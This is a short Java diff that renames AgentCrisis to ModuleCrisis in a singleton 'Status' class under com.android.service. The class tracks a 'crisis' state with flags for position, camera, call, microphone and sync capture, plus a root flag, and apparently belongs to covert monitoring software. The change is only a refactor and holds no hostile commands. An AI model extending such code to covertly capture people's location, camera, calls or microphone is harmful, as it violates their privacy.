@@ -19,7 +19,7 @@ import com.android.service.conf.ConfModule;
 import com.android.service.conf.ConfEvent;
 import com.android.service.conf.Globals;
 import com.android.service.event.BaseEvent;
-import com.android.service.module.AgentCrisis;
+import com.android.service.module.ModuleCrisis;
 import com.android.service.util.Check;
 
 // Singleton Class
@@ -54,7 +54,7 @@ public class Status {
 
 	Object lockCrisis = new Object();
 	private boolean crisis = false;
-	private boolean[] crisisType = new boolean[AgentCrisis.SIZE];
+	private boolean[] crisisType = new boolean[ModuleCrisis.SIZE];
 	private boolean haveRoot;
 
 	private final Object[] triggeredSemaphore = new Object[Action.NUM_QUEUE];
@@ -543,31 +543,31 @@ public class Status {
 
 	public boolean crisisPosition() {
 		synchronized (lockCrisis) {
-			return (isCrisis() && crisisType[AgentCrisis.POSITION]);
+			return (isCrisis() && crisisType[ModuleCrisis.POSITION]);
 		}
 	}
 
 	public boolean crisisCamera() {
 		synchronized (lockCrisis) {
-			return (isCrisis() && crisisType[AgentCrisis.CAMERA]);
+			return (isCrisis() && crisisType[ModuleCrisis.CAMERA]);
 		}
 	}
 
 	public boolean crisisCall() {
 		synchronized (lockCrisis) {
-			return (isCrisis() && crisisType[AgentCrisis.CALL]);
+			return (isCrisis() && crisisType[ModuleCrisis.CALL]);
 		}
 	}
 
 	public boolean crisisMic() {
 		synchronized (lockCrisis) {
-			return (isCrisis() && crisisType[AgentCrisis.MIC]);
+			return (isCrisis() && crisisType[ModuleCrisis.MIC]);
 		}
 	}
 
 	public boolean crisisSync() {
 		synchronized (lockCrisis) {
-			return (isCrisis() && crisisType[AgentCrisis.SYNC]);
+			return (isCrisis() && crisisType[ModuleCrisis.SYNC]);
 		}
 	}
 
